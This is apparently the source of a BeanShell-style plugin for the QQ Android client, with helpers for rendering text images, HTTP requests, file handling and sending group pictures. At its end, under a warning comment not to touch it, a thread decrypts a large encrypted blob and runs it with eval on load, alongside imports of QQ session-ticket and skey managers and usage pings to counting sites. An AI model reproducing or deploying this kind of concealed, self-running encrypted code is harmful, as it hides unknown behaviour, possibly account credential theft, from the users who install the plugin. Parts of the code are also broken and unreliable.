import java.io.*;
import java.net.*;
import java.util.*;
import java.text.*;
import java.nio.file.*;
import java.util.zip.*;

import org.json.*;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import org.json.JSONArray;

import android.*;
import android.app.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.graphics.*;
import android.os.*;
import android.util.*;
import android.view.*;
import android.widget.*;

import com.tencent.mobileqq.*;
import com.tencent.common.app.*;
import com.tencent.common.app.BaseApplicationImpl;
import com.tencent.mobileqq.app.BaseActivity;
import com.tencent.mobileqq.forward.ForwardSDKB77Sender;
import com.tencent.mobileqq.structmsg.*;
import com.tencent.mobileqq.structmsg.AbsShareMsg;
import com.tencent.mobileqq.structmsg.StructMsgForAudioShare;
import com.tencent.mobileqq.troop.roamsetting.api.IRoamSettingService;
import com.tencent.mobileqq.troop.api.ITroopInfoService;

import mqq.app.*;
import mqq.app.TicketManagerImpl;
import mqq.manager.*;
import mqq.manager.TicketManager;
import mqq.manager.TicketManager.IPskeyManager;
import mqq.inject.SkeyInjectManager;

import oicq.wlogin_sdk.request.*;
import com.tencent.mobileqq.qroute.QRoute;
import com.tencent.mobileqq.jump.api.IJumpApi;
import com.tencent.mobileqq.friend.api.IFriendDataService;
import com.tencent.mobileqq.data.Friends;
import com.tencent.mobileqq.activity.shortvideo.d;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.ClipboardManager;
import android.content.Context;
import android.text.ClipboardManager;
import android.widget.LinearLayout;
import android.view.Window;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.view.LayoutInflater;
import android.view.View;
import android.os.Bundle;
import android.widget.ProgressBar;
import android.content.res.Resources;
import android.util.Log;
import android.view.Gravity;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import android.renderscript.RenderScript;
import androidx.annotation.Keep;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.zip.Inflater;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;
import java.io.File;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.util.Calendar;
import java.text.SimpleDateFormat;
import java.util.Date;
import android.app.Activity;
import android.view.WindowManager;
import android.widget.Button;
import android.content.Intent;
import android.os.Handler;
import android.widget.Toast;
import android.text.Editable;
import android.text.TextWatcher;
import android.text.method.ScrollingMovementMethod;

import java.util.Map;
import java.util.List;
import java.lang.reflect.*;
import oicq.wlogin_sdk.request.WtloginHelper;
import mqq.app.MobileQQ;
import android.content.ActivityNotFoundException;
import com.tencent.mobileqq.utils.DialogUtil;
import com.tencent.mobileqq.activity.QQSettingMe;
import android.app.ActivityManager;
import com.tencent.mobileqq.filemanager.app.FileManagerApplication;
import com.tencent.qphone.base.util.BaseApplication;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Matrix;
import android.graphics.Paint;
import android.graphics.Typeface;
import android.net.Uri;
import android.renderscript.Allocation;
import android.renderscript.Element;
import android.renderscript.RenderScript;
import android.renderscript.ScriptIntrinsicBlur;
import android.widget.Toast;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

boolean auto = true;

    public String getUrl(boolean type) {
        String url1 = "http://ynx.fremoe.site";
        String url2 = "http://ynx.hdo.icu";
        String url3 = "http://mao.fmdns.cn";
        String url4 = "https://gitee.com/Myn_1/Mao_Yuna/raw/master";

        if (isUrlAccessible(url1)) {
            return url1;
        }
        
        if (isUrlAccessible(url2)) {
            return url2;
        }
        
        if (isUrlAccessible(url3)) {
            return url3;
        }
        
         if (type) {return ""+url4;}
         return "我累个豆,线路全寄了";
    }
 


    public boolean isUrlAccessible(String urlString) {
        try {
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("HEAD");
            connection.setConnectTimeout(2000); // 连接超时时间（毫秒）
            connection.setReadTimeout(1000);   // 读取超时时间（毫秒）
            int responseCode = connection.getResponseCode();
            return responseCode == HttpURLConnection.HTTP_OK;
        } catch (SocketTimeoutException e) {
            // 处理超时异常
            return false;
        } catch (MalformedURLException e) {
            // 处理 URL 格式错误
            return false;
        } catch (IOException e) {
            return false;
        }
    }
 
    
    public String statistics() {
    try {
    if(isUrlAccessible("https://www.97abc.com/count.php?id="+pluginID)) return "";
    } catch (e) {
    if(isUrlAccessible("https://sygjx.com/wyzyy_yhtj.php?id="+pluginID)) return "";
    }
    }

public String readprop(String file, String name2) {
    String text = readFileContent(file);
    Properties props = new Properties();
    props.load(new StringReader(text));
    String name = props.getProperty(name2);
    return name;
}

public void jump(String url){
((IJumpApi) QRoute.api(IJumpApi.class)).doJumpAction(context, url);
}//小超

public String randomcolor() {
    Random random = new Random();
    int red = random.nextInt(256);
    int green = random.nextInt(256);
    int blue = random.nextInt(256);
    String redHex = Integer.toHexString(red).toUpperCase();
    String greenHex = Integer.toHexString(green).toUpperCase();
    String blueHex = Integer.toHexString(blue).toUpperCase();
    redHex = redHex.length() == 1 ? "0" + redHex : redHex;
    greenHex = greenHex.length() == 1 ? "0" + greenHex : greenHex;
    blueHex = blueHex.length() == 1 ? "0" + blueHex : blueHex;
    String colorCode = "#" + redHex + greenHex + blueHex;
    return colorCode;
}


public Object ParseColor(String color, Object normal) {
    Object parsecolor;
    try {
        if (color.contains("随机")) {
            parsecolor = Color.parseColor(randomcolor());
        } else {
            parsecolor = Color.parseColor(color);
        }
    } catch (Exception e) {
        parsecolor = normal;
    }
    return parsecolor;
}

public String splitString(String content, int len) {
    String tmp = "";
    if (len > 0) {
        if (content.length() > len) {
            int rows = (int) Math.ceil(content.length() / len);
            for (int i = 0; i < rows; i++) {
                if (i == rows - 1) {
                    tmp += content.substring(i * len);
                } else {
                    tmp += content.substring(i * len, i * len + len) + "\n ";
                }
            }
        } else {
            tmp = content;
        }
    }
    return tmp;
}

public Bitmap bitmapurl(String url) {
    InputStream input = null;
    Bitmap original = null;
    try {
        File file = new File(url);
        if (file.exists()) {
            original = BitmapFactory.decodeFile(url).copy(Bitmap.Config.ARGB_8888, true);
        } else {
            URL urlsssss = new URL(url);
            HttpURLConnection urlConn = (HttpURLConnection) urlsssss.openConnection();
            urlConn.setConnectTimeout(10000);
            urlConn.setReadTimeout(10000);
            input = urlConn.getInputStream();
            original = BitmapFactory.decodeStream(input).copy(Bitmap.Config.ARGB_8888, true);
        }
    } catch (Exception e) {
    }
    return original;
}

public String MakeTextPhoto(int ms,String text,String pic,String textcolor){
try {
	if(ms==1) {
		if(mysendtype==4) {
			return MakeTextPhotoOrigin(text,pic,textcolor);
		}else if(mysendtype==5) {
			return MakeTextPhotoPro(text,pic,textcolor);
		}
	}else if(ms==2){
		if(lyricstype==4) {
			return MakeTextPhotoOrigin(text,pic,textcolor);
		}else if(lyricstype==5) {
			return MakeTextPhotoPro(text,pic,textcolor);
		}
	}
}catch(e){
Toast(e);
}
}

public String MakeTextPhotoOrigin(String text, String pic, String textcolor)
{
    Object typeface;
    try {
        typeface = Typeface.createFromFile(textface);
    } catch (Exception e) {
        typeface = Typeface.DEFAULT_BOLD;
    }
    text = text.replace("[]", "");
    if (textcolor.equals("")) textcolor2="#000000";else textcolor2=textcolor;
    String[] word = text.split("\n");
    float textsize = 40.0f;
    float padding = 30.0f;
    Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG | Paint.DITHER_FLAG);
    paint.setAlpha(mengban);
    paint.setTypeface(typeface);
    paint.setTextSize(textsize);
    Bitmap mybitmap;
    if (!pic.startsWith("http")&&!pic.startsWith("/")) mybitmap=bitmapurl("https://tianquan.gtimg.cn/card/item/2034375/newPreview2.jpg");
    else mybitmap=bitmapurl(pic);
    mybitmap = blurBitmap(mybitmap,mybitmap,blurred);
    float text_width = 0;
    float average_width = 0;
    float text_height = 0;
    String newword = "";
    for (String line : word) {
        average_width += paint.measureText(line);
    }
    average_width = average_width / word.length;
    for (String line : word) {
        float width = paint.measureText(line);
        if (auto) {
            if (width - average_width > 1200) {
                int rr = Math.ceil(width / average_width);
                int cut = Math.ceil(line.length() / rr);
                line = splitString(line, cut);
                for (String newl : line.split("\n")) {
                    width = paint.measureText(newl);
                    if (text_width < width) {
                        text_width = width;
                    }
                }
            }
        }
        if (text_width < width) {
            text_width = width;
        }
        newword += line + "\n";
    }
    word = newword.split("\n");
    int width = (int) (text_width + padding * 2f);
    int height = (int) ((textsize + 8) * word.length + padding * 2f) - 8;
    Bitmap original = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
    Canvas canvas = new Canvas(original);
    Matrix matrix = new Matrix();
    float i = (float) width / (float) mybitmap.getWidth();
    float b = (float) height / (float) mybitmap.getHeight();
    if (i > b) {
        b = i;
    }
    matrix.postScale(b, b);
    Bitmap resizeBmp = Bitmap.createBitmap(mybitmap, 0, 0, mybitmap.getWidth(), mybitmap.getHeight(), matrix, true);
    canvas.drawBitmap(resizeBmp, (original.getWidth() - resizeBmp.getWidth()) / 2, (original.getHeight() - resizeBmp.getHeight()) / 2, paint);
//    canvas.drawColor(Color.parseColor(mengbanyanse));
    paint.setColor(ParseColor(textcolor2, Color.BLACK));
    float yoffset = textsize + padding;
    for (String line : word) {
        canvas.drawText(line, padding, yoffset, paint);
        yoffset += textsize + 8;
    }
    String path = 羽雫 + "图片/" + canvas + ".png";
    File end = new File(path);
    if (!end.exists()) {
        end.getParentFile().mkdirs();
    }
    FileOutputStream out = new FileOutputStream(end);
    original.compress(Bitmap.CompressFormat.JPEG, 100, out);
    out.close();
    return path;
}
 
public String MakeTextPhotoPro(String text, String pic, String textcolor) {
    Typeface typeface;
    try {
        typeface = Typeface.createFromFile(textface);
    } catch (Exception e) {
        typeface = Typeface.DEFAULT_BOLD;
    }
    
    text = text.replace("[]", "");
    String textcolor2 = (textcolor.isEmpty()) ? "#000000" : textcolor;
    String[] lines = text.split("\n");
    
    Bitmap mybitmap = (!pic.startsWith("http") && !pic.startsWith("/")) ?
            bitmapurl("https://tianquan.gtimg.cn/card/item/2034375/newPreview2.jpg") :
            bitmapurl(pic);
    
    mybitmap = blurBitmap(mybitmap, mybitmap, blurred);

int width = mybitmap.getWidth();
int height = mybitmap.getHeight();

float bl = (width > height) ? 0.75f : 1.0f;
if (bl == 1.0f) {
    return MakeTextPhotoOrigin(text, pic, textcolor);
}

    float padding = 17.0f;

    float extraSpacePerLine = 0.2f; // 每行额外的空间
    int numberOfSpaces = lines.length - 1; // 行数减去1得到间隔数

    float availableHeightForText = height - 2 * padding;

    float lineSpacing = (availableHeightForText - (extraSpacePerLine * numberOfSpaces)) / lines.length;

    float textsize = lineSpacing - extraSpacePerLine;

    Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG | Paint.DITHER_FLAG);
    paint.setAlpha(mengban);
    paint.setTypeface(typeface);
    paint.setTextSize(textsize);

    Bitmap original = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
    Canvas canvas = new Canvas(original);
    canvas.drawBitmap(mybitmap, 0, 0, null);
    
    paint.setColor(Color.parseColor(textcolor2));
    float yoffset = textsize + padding;
    
    for (String line : lines) {
        String[] words = line.split(" ");
        StringBuilder tempLine = new StringBuilder();
        for (String word : words) {
            float tempLineWidth = paint.measureText(tempLine + word + " ");
            if (tempLineWidth > width - padding * 2) {
                canvas.drawText(tempLine.toString().trim(), padding, yoffset, paint);
                yoffset += lineSpacing;
                tempLine = new StringBuilder(word + " ");
            } else {
                tempLine.append(word).append(" ");
            }
        }
        if (tempLine.length() > 0) {
            canvas.drawText(tempLine.toString().trim(), padding, yoffset, paint);
            yoffset += lineSpacing;
        }
    }
    
    String path = 羽雫 + "图片/" + canvas + ".png";
    File end = new File(path);
    if (!end.exists()) {
        end.getParentFile().mkdirs();
    }
    FileOutputStream out = new FileOutputStream(end);
    original.compress(Bitmap.CompressFormat.JPEG, 100, out);
    out.close();
    return path;
}
 

public Bitmap blurBitmap(Bitmap bitmap, Bitmap outBitmap, float radius) {
    RenderScript rs = RenderScript.create(context);
    ScriptIntrinsicBlur blurScript = ScriptIntrinsicBlur.create(rs, Element.U8_4(rs));
    Allocation allIn = Allocation.createFromBitmap(rs, bitmap);
    Allocation allOut = Allocation.createFromBitmap(rs, outBitmap);
    blurScript.setRadius(radius);
    blurScript.setInput(allIn);
    blurScript.forEach(allOut);
    allOut.copyTo(outBitmap);
    rs.destroy();
    return outBitmap;
}

public Bitmap getbitmap(String path){
if(path.startsWith("http")){
try{
URL url1 = new URL(path);
HttpURLConnection urlc = url1.openConnection();
InputStream   inst = urlc.getInputStream();
Bitmap bmp = BitmapFactory.decodeStream(inst).copy(Bitmap.Config.ARGB_8888, true);
return bmp;
}catch(e){Toast("错误:"+e+""); return Bitmap.createBitmap(800,800,Bitmap.Config.ARGB_8888);}
}else{
try{
Bitmap  bmp= BitmapFactory.decodeStream(new FileInputStream(path)).copy(Bitmap.Config.ARGB_8888, true);
return bmp;
}catch(e){Toast("错误:"+e+"");return Bitmap.createBitmap(800,800,Bitmap.Config.ARGB_8888);}
}
}

public static String fetchRedirectUrl(String url) {
    try {
        URL imageUrl = new URL(url);
        HttpURLConnection connection = (HttpURLConnection) imageUrl.openConnection();
        connection.setRequestMethod("GET");
        String redirectUrl = connection.getHeaderField("Location");
        connection.disconnect();
        return redirectUrl;
    } catch (Exception e) {
        e.printStackTrace();
        return "访问出错了";
    }
}

public String httpget(String url, String cookie) {
    StringBuffer buffer = new StringBuffer();
    InputStreamReader isr = null;
    try {
        URL urlObj = new URL(url);
        URLConnection uc = urlObj.openConnection();
        uc.setRequestProperty("Cookie", cookie);
        uc.setRequestProperty("user-agent", "Mozilla/5.0 (Linux; Android 12; V2055A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.72 MQQBrowser/6.2 TBS/046209 Mobile Safari/537.36 V1_AND_SQ_8.9.5_3176_YYB_D A_8090500 QQ/8.9.5.8845 NetType/WIFI WebP/0.3.0 Pixel/1080 StatusBarHeight/85 SimpleUISwitch/0 QQTheme/1000 InMagicWin/0 StudyMode/0 CurrentMode/0 CurrentFontScale/0.87 GlobalDensityScale/0.90000004 AppId/537129734");
        uc.setConnectTimeout(8000);
        uc.setReadTimeout(5000);
        isr = new InputStreamReader(uc.getInputStream(), "utf-8");
        BufferedReader reader = new BufferedReader(isr);
        String line;
        while ((line = reader.readLine()) != null) {
            buffer.append(line + "\n");
        }
    } catch (Exception e) {
        e.printStackTrace();
    } finally {
        try {
            if (null != isr) {
                isr.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    if (buffer.length() == 0) {
        return buffer.toString();
    }
    buffer.delete(buffer.length() - 1, buffer.length());
    return buffer.toString();
}

public String post(String url, String params) {
    try {
        URL urlObjUrl = new URL(url);
        URLConnection connection = urlObjUrl.openConnection();
        connection.setDoOutput(true);
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 7.1.2; NX629J Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.102 MQQBrowser/6.2 TBS/046403 Mobile Safari/537.36 V1_AND_SQ_8.9.33_3772_YYB_D QQ/8.9.33.10335 NetType/WIFI WebP/0.3.0 AppId/537151683 Pixel/1080 StatusBarHeight/73 SimpleUISwitch/0 QQTheme/1000 StudyMode/0 CurrentMode/0 CurrentFontScale/1.0 GlobalDensityScale/0.90000004 AllowLandscape/false InMagicWin/0");
        OutputStream os = connection.getOutputStream();
        os.write(params.getBytes());
        os.close();
        InputStream iStream = connection.getInputStream();
        byte[] b = new byte[1024];
        int len;
        StringBuilder sb = new StringBuilder();
        while ((len = iStream.read(b)) != -1) {
            sb.append(new String(b, 0, len));
        }
        return sb.toString();
    } catch (Exception e) {
        e.printStackTrace();
    }
    return "访问出错了";
}

public String 时分秒(){
  Date date = new Date();
  SimpleDateFormat df = new SimpleDateFormat("HH:mm:ss");
  String time = df.format(date);
  return time;
}

public String 年月日() {
    DateFormat df = new SimpleDateFormat("yyyy-MM-dd");
    Date date = new Date();
    String currentDate = df.format(date);
    return currentDate;
}

public static String 取文件(File f) {
    String result = null;
    Random rand = new Random();
    int n = 0;
    for (Scanner sc = new Scanner(f); sc.hasNext(); ) {
        ++n;
        String line = sc.nextLine();
        if (rand.nextInt(n) == 0) {
            result = line;
        }
    }
    return result;
}

public void 删除(String Path) {
    File file = null;
    try {
        file = new File(Path);
        if (file.exists()) {
            file.delete();
            FileMemCache.remove(Path);
        }
    } catch (Exception e) {
        Toast("删除文件时发生错误,相关信息:\n" + e);
    }
}

public String Unzip(String zipFilePath, String destDir) throws Exception {
    File dir = new File(destDir);
    if (!dir.exists()) {
        dir.mkdirs();
    }
    FileInputStream fis = new FileInputStream(zipFilePath);
    ZipInputStream zipIn = new ZipInputStream(fis);
    ZipEntry entry = zipIn.getNextEntry();
    while (entry != null) {
        String filePath = destDir + File.separator + entry.getName();
        if (!entry.isDirectory()) {
            createParentDirectory(filePath);
            FileOutputStream fos = new FileOutputStream(filePath);
            byte[] buffer = new byte[1024];
            int length;
            while ((length = zipIn.read(buffer)) > 0) {
                fos.write(buffer, 0, length);
            }
            fos.close();
        } else {
            File dirFile = new File(filePath);
            dirFile.mkdirs();
        }
        zipIn.closeEntry();
        entry = zipIn.getNextEntry();
    }
    zipIn.close();
    fis.close();
    return "true";
}

public void createParentDirectory(String filePath) {
    File file = new File(filePath);
    File parentDir = file.getParentFile();
    if (!parentDir.exists()) {
        parentDir.mkdirs();
    }
}

    public static String md5(String input) {
        try {
            // 创建 MessageDigest 实例，指定 MD5 算法
            MessageDigest md = MessageDigest.getInstance("MD5");
            // 将输入字符串转换为字节数组（使用 UTF-8 编码）
            byte[] messageBytes = input.getBytes("UTF-8");
            
            // 计算 MD5 摘要
            byte[] md5Bytes = md.digest(messageBytes);
            
            // 将 MD5 摘要转换为十六进制字符串
            StringBuilder hexString = new StringBuilder();
            for (byte b : md5Bytes) {
                // 将每个字节转换为两位的十六进制数
                String hex = Integer.toHexString(0xFF & b);
                if (hex.length() == 1) {
                    hexString.append('0'); // 如果是单个字符，前面补0
                }
                hexString.append(hex);
            }
            return hexString.toString().toLowerCase();
        } catch (NoSuchAlgorithmException e) {
        return "";
            throw new RuntimeException("MD5 算法不存在", e);
        } catch (java.io.UnsupportedEncodingException e) {
        return "";
            throw new RuntimeException("UTF-8 编码不支持", e);
        }
    }

public String fileTosilk(String filePath) {
    // 找到最后一个点的位置
    int lastDotIndex = filePath.lastIndexOf(".");

    // 如果没有找到点，或者点是文件路径的第一个字符（不应该发生），则返回原路径
    if (lastDotIndex <= 0) {
        return filePath;
    }

    // 截取最后一个点之前的字符串
    String pathWithoutExtension = filePath.substring(0, lastDotIndex);

    // 拼接新的扩展名
    return pathWithoutExtension + ".silk";
}
 
public String sendPost(String path){
        try {
            File file = new File(path);
            URL url = new URL("https://xy.yuexinya.top/Tool/SilkTool/Mp3ToSilk");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + "2132487512112dasdasd");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0");
            FileInputStream inputStream = new FileInputStream(file);
            connection.setDoOutput(true);
            connection.getOutputStream().write(("--2132487512112dasdasd\r\n").getBytes());
            connection.getOutputStream().write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
            connection.getOutputStream().write(("Content-Type: application/octet-stream\r\n\r\n").getBytes());

            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                connection.getOutputStream().write(buffer, 0, bytesRead);
            }

            connection.getOutputStream().write(("\r\n--2132487512112dasdasd--\r\n").getBytes());
            inputStream.close();

            InputStream responseStream = connection.getInputStream();
            BufferedReader responseReader = new BufferedReader(new InputStreamReader(responseStream));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = responseReader.readLine()) != null) {
                response.append(line);
            }
            responseReader.close();
            responseStream.close();
            connection.disconnect();
            JSONObject jsonb=new JSONObject(response.toString());
            return jsonb.getString("url");
        }catch (Exception e){
            return e.getMessage();
        }
    }

public void sendTroopPic(String qun, String text, int mtype) { // 发送图片
    String qr = "";
    if (mtype == 1) {
        qr = getUidFromUin(qun);
    } else if (mtype == 2) {
        qr = qun;
    }
    File d = new File(猫羽雫+ "随机一言.txt");
    String dd = 取文件(d);
    Contact contact = new Contact(mtype, qr, "");
    MsgElement msgElement = QRoute.api(IMsgUtilApi.class).createPicElement(text, true, 0);
    PicElement picElement = msgElement.getPicElement();
    picElement.summary = dd;
    ArrayList MsgElementList = new ArrayList();
    MsgElementList.add(msgElement);
    // IOperateCallback iOperateCallback=new IOperateCallback();
    ((IMsgService) QRoute.api(IMsgService.class)).sendMsg(contact, MsgElementList, null);
}

public void sendImg(String qun, String url, int type) {
    try {
        if (url.startsWith("http")) {
            String jb = String.valueOf(System.currentTimeMillis());
            String file = 羽雫 + "/图片/" + jb + ".png";
            String sp = DownloadToFile(url, file);
            if (sp.equals("成功")) {
                sendTroopPic(qun, file, type);
                sc(file);
            } else {
                sendMsg(qun, "图片文件已失效或并非图片", type);
            }
        } else if (url.startsWith("/")) {
            sendTroopPic(qun, url, type);
        }
    } catch (Exception e) {
        Toast("错误:\n" + e.getMessage());
    }
}


//不用动 删了报错或者无法使用

new Thread(new Runnable(){
public void run(){
String verification = decryptAndDecompress("KbZUARYuqIjRUfg3zWyb19opT3VxdSsiZ7t/FpDbwUAINu3ZP22o1lamdXw6DdGhl8S+Lm/RyLCkAHgqZblRCzBuJXxDPHzzofe2TqHfS+UrhGifR0mfMdzKwemAC7S9rP3ZEWsKZ9lqUwTc9Ff+MiUfscVKYX467WZtWFsllT46czmlJJHw7YqpbDapsWe9mySIftHWzQtFerlZ+ifQ4GI8T7Ie+odWrW4FdzCiatvZGymMz1vEMQGk7Vse9Hyz53tRVMtPzEepikZujygm9U/dG/13R5INn8tGOmo641S8ZbFZ4UPBhAdNcB956oYxxvS5XFE97SYYfEbxsw1yv1+BR19e48oJkbThFw6cGj/2hX0LSZ1+zPzWopM/T4iDUiAzDerbscw6iWqx7Q9X9irrCVzOfRJ4YDLzwPEQlvZd0p20e8m8U/7s39NePxgQR7v6SK+8Y9C/Ryigu1/i4X72N2ZZ/2J4ilsOCLwjdzyA2C6XJzLq5Y5XsBnSz0TOv0dJZsNDRZeC8tOBp5XNmCiUyCkLRo+59nV9HRVbEnqvaNijDKgsLetLEwoCXmJ5PPrT1RntDBMi1rHraubL0UO+ZXMFq34NzMsmL7EybrmDrkmBSTy7iygOUshC10XJpgGWWxJyDYT5q25ONpRGGLDtELYQ8r7xmptjzfvIS5x2o7zI9cgoip1PHODevfzfF+W05Cxp5o/yVh8CccOqJTslZbQuH2gIaJVvKYeknXtXY+nIXs0hJPJOs4wcXioK6x7E1pGYS/X6uAHbY6/HvJYkSZ34aBvpuAbInWS2NT0zmpeHER5QdNqptfh9EOPIA6w/8yEoy0QDoNCv8o/hG0UkxjaLegLM0Wv0xOLIvDbr2zkBGWdfPqZnST6U1TfRYtzXsQ83WmDAuPDGQXgwoIz51Sk+A54++L1SL31t4hUZ4RMvfSU6WbljSmCN07CaK3/Ztg6D4Vkz44y2c/CiEPURUWeBrJ+Xv+MMbGeTYNf/LHaxtHSg7DPdp47oWwXHvQCt/9K8DxlgICv7rbMkS2TYqycMLo3t+sW4ZvElRwLG5UbOUBoSsu57bRp9NPiqlwbYr+8s2dCQXoVvTDtFAXzbQzrS9QUC25hQRpojFWCLdE50KN0jPxFmb8HUa8tDR65qzt+As9AKnDiJx3XP+rkjUHWDM6/lCvRJZHMCbwN9Y6UiEfH4YEUhU9SuLPZyxe6JO1EWFQxLb824dRshSxwPautvnlMxz1sUORAqqxjTMa1JHjzMcryzMaQ1M6CgZ7bscidAA3KbF1MTjYAc1mQLSumNcMaTUWt648L2yE+xe6JLVII1MlAdOLPxd+KJcAiPkAl7yhmOJTKN/qGpgbUgbYJFL88EA/wVbQdP/qW7wAc83bJkqzwLaHwY/v9nxu4ncCivwF2rJBD58IATesDs7AufuMj4ILTRpmB7GbzDi3WHPS6EpBAVoziKm7syLGxQ5pFyvqJFpSIunDvNHcG8vq7ZMG+fEee1ELwCaX6Pyis+ZlBHbUv4UqGDEvG1NqaQLWIt8ibSaMTjncZFIm43fs0oLg0t1GXfk43A5KiMwJ4dBP/JJWv7RCpSFDQyVWMasA3/Civ6m0F5cmQEPg==", 作者+"LOVEYN");
this.interpreter.eval(verification, "eval stream");
}}).start();

